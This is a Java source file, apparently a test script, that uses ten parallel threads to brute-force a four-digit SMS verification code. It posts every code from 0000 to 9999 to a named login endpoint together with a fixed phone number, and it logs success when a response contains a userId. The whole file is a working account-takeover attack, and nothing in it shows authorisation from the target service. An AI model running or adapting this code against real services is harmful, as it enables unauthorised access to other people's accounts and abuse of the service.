package develop.test;

import java.util.HashMap;
import java.util.Map;

import org.apache.log4j.Logger;

import net.sf.json.JSONObject;
import tools.util.HttpTools;
import tools.util.HttpUtil;

public class dkasdaskj {
	public  static  Logger logger = Logger.getLogger(dkasdaskj.class);
	
	
	
	
	class thread extends Thread{
		private int start;
		private int end;
		
		public thread(int start,int end){
			this.start=start;
			this.end=end;
		}

		@Override
		public void run() {
			// TODO Auto-generated method stub
			for (int a=start;a<=end;a++){
				
				String sss="https://wx.trc.com/account/auth/simple";
				
				
					String qian;
					if (a<10) {
						qian="000";
					}
					else if(a<100){
						qian="00";
					}
					else if(a<1000){
						qian="0";
					}else{
						qian="";
					}					
					qian=qian+a;
					//System.out.println(qian);
					JSONObject test=new JSONObject();
					test.put("phone", "18758017446");
					test.put("code", qian);
					test.put("inviteCode","");
					
					HttpTools SS= new HttpTools();
					SS.doPostxxx(sss, test);
					//SS.doPostJSON(sss, test);
				//	HttpUtil.printEntity();
					String aaaa=SS.getEntitys();
					System.out.println("第"+a+"次！");
					try {
						Thread.sleep(100);
					} catch (InterruptedException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					JSONObject result=JSONObject.fromObject(aaaa);
					if(result.containsKey("userId")){
						System.out.println("*************************认证中心炸了！");
						logger.info("*************************认证中心炸了！");
					}
				
			}
			
			
			
			super.run();
		}
		
		
	}
	
	
	public void test111(){
		
		for (int i = 0; i <= 9; i++) {
			new thread(i*1000,i*1000+999).start();
		}
		
	}
	
	static Map<String,String> map2=new HashMap<>();
	static{
		map2.put("Connection","keep-alive");
		map2.put("Accept","*/*");
		map2.put("Origin","http://view.trc.com");
		map2.put("X-Requested-With","XMLHttpRequest");
		map2.put("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36");
		map2.put("Referer","http://view.trc.com/member-idcard.html");
		map2.put("Accept-Encoding","gzip, deflate");
		map2.put("Accept-Language","zh-CN,zh;q=0.8");
}
	public static void main(String[] args) {

	new dkasdaskj().test111();

		
	}
}
